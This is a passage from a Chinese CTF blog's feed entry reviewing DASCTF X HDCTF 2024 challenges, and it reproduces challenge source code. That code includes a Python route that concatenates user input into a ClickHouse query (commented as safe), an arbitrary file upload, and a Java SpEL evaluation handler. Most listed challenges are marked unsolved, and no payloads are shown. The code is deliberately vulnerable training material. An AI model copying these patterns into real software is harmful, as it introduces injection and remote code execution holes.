punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment">#此处是clickhouse的查询语法，不存在注入问题</span>        sql <span class="token operator">=</span> <span class="token string">'SELECT * FROM ctf.users WHERE id = '</span> <span class="token operator">+</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span>        res<span class="token operator">=</span>client<span class="token punctuation">.</span>command<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>        client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> e<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行sql查询</p><p><img src="/blog/2024/06/02/DASCTF-X-HDCTF-2024/image-20240602121309967.png" alt="image-20240602121309967"></p><p>&#x2F;upload路由：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/upload"</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'file'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>    <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>    filename <span class="token operator">=</span> <span class="token string">"Boogipop"</span>    file_path <span class="token operator">=</span><span class="token string">"/tmp/"</span><span class="token operator">+</span>filename    <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>    <span class="token keyword">return</span> file_path<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一个任意文件上传的功能，上传的文件路径为<code>/tmp/Boogipop</code></p><hr><h2 id="ImpossibleUnser-Unsolved"><a href="#ImpossibleUnser-Unsolved" class="headerlink" title="ImpossibleUnser (Unsolved)"></a>ImpossibleUnser (Unsolved)</h2><p>先审代码</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ctf</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>net<span class="token punctuation">.</span>httpserver<span class="token punctuation">.</span></span><span class="token class-name">HttpServer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">InetSocketAddress</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">Executor</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">IndexController</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HttpServer</span> server <span class="token operator">=</span> <span class="token class-name">HttpServer</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InetSocketAddress</span><span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        server<span class="token punctuation">.</span><span class="token function">createContext</span><span class="token punctuation">(</span><span class="token string">"/ctf"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">SPELHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        server<span class="token punctuation">.</span><span class="token function">createContext</span><span class="token punctuation">(</span><span class="token string">"/index"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">IndexHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        server<span class="token punctuation">.</span><span class="token function">createContext</span><span class="token punctuation">(</span><span class="token string">"/unser"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">UnserHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        server<span class="token punctuation">.</span><span class="token function">setExecutor</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Executor</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        server<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>/ctf</code>路由：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ctf</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>net<span class="token punctuation">.</span>httpserver<span class="token punctuation">.</span></span><span class="token class-name">HttpExchange</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>net<span class="token punctuation">.</span>httpserver<span class="token punctuation">.</span></span><span class="token class-name">HttpHandler</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStreamReader</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">OutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLDecoder</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SPELHandler</span> <span class="token keyword">implements</span> <span class="token class-name">HttpHandler</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">SPELHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token class-name">HttpExchange</span> httpExchange<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">InputStream</span> requestBody <span class="token operator">=</span> httpExchange<span class="token punctuation">.</span><span class="token function">getRequestBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> body <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">readInputStream</span><span class="token punctuation">(</span>requestBody<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>body<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> <span class="token class-name">PostData</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">parseFormData</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token class-name">PostData</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"payload"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            payload <span class="token operator">=</span> <span class="token class-name">URLDecoder</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">MySecurityWaf</span> mySecurityWaf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MySecurityWaf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>mySecurityWaf<span class="token punctuation">.</span><span class="token function">securitycheck</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Object</span> value <span class="token operator">=</span> exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">String</span> response <span class="token operator">=</span> <span class="token string">"Welcome to My Challenge"</span><span class="token punctuation">;</span>                httpExchange<span class="token punctuation">.</span><span class="token function">sendResponseHeaders</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>response<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">OutputStream</span> os <span class="token operator">=</span> httpExchange<span class="token punctuation">.</span><span class="token function">getResponseBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                os<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                os<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">String</span> response <span class="token operator">=</span> <span class="token string">"Give me some payload Plz inject me"</span><span class="token punctuation">;</span>        httpExchange<span class="token punctuation">.</span><span class="token function">sendResponseHeaders</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>response<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">OutputStream</span> os <span class="token operator">=</span> httpExchange<span class="token punctuation">.</span><span class="token function">getResponseBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        os<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        os<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> <span class="token function">parseFormData</span><span class="token punctuation">(</span><span class="token class-name">String</span> body<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> kvPairs <span class="token operator">=</span> body<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var4 <span class="token operator">=</span> kvPairs<span class="token punctuation">;</span>        <span class="token keyword">int</span> var5 <span class="token operator">=</span> kvPairs<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> var6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var6 <span class="token operator">&lt;</span> var5<span class="token punctuation">;</span> <span class="token operator">++</span>var6<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> kv <span class="token operator">=</span> var4<span class="token punctuation">[</span>var6<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> splits <span class="token operator">=</span> kv<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            params<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>splits<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> splits<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> params<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token function">readInputStream</span><span class="token punctuation">(</span><span class="token class-name">InputStream</span> is<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">InputStreamReader</span> sr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> len<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>len <span class="token operator">=</span> sr<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用来打SPEL的</p><hr><h2 id="NoCommonCollections-Unsolved"><a href="#NoCommonCollections-Unsolved" class="headerlink" title="NoCommonCollections (Unsolved)"></a>NoCommonCollections (Unsolved)</h2><hr><h2 id="Ezdotnet-Unsolved"><a href="#Ezdotnet-Unsolved" class="headerlink" title="Ezdotnet (Unsolved)"></a>Ezdotnet (Unsolved)</h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;das偶遇b神出题，java&amp;amp;.net&amp;amp;python强如怪物，拼尽全力也无法战胜😭（也就是又爆零了）&lt;/p&gt;
&lt;p&gt;应该是近期最后一次打ctf了，剩下的事交给复现了&lt;/p&gt;
&lt;p&gt;官方wp：&lt;a href=&quot;https://www.yuque.com/yuqueyonghu30d1fk/gd2y5h/ksfsfw8yf1u2xhhq?singleDoc#&quot;&gt;https://www.yuque.com/yuqueyonghu30d1fk/gd2y5h/ksfsfw8yf1u2xhhq?singleDoc#&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF线上赛" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
    <category term="python" scheme="http://c1oudfl0w0.github.io/blog/tags/python/"/>
    
    <category term="反序列化" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="非传统框架" scheme="http://c1oudfl0w0.github.io/blog/tags/%E9%9D%9E%E4%BC%A0%E7%BB%9F%E6%A1%86%E6%9E%B6/"/>
    
    <category term=".NET" scheme="http://c1oudfl0w0.github.io/blog/tags/NET/"/>
    
    <category term="SSRF" scheme="http://c1oudfl0w0.github.io/blog/tags/SSRF/"/>
    
  </entry>
  
</feed>
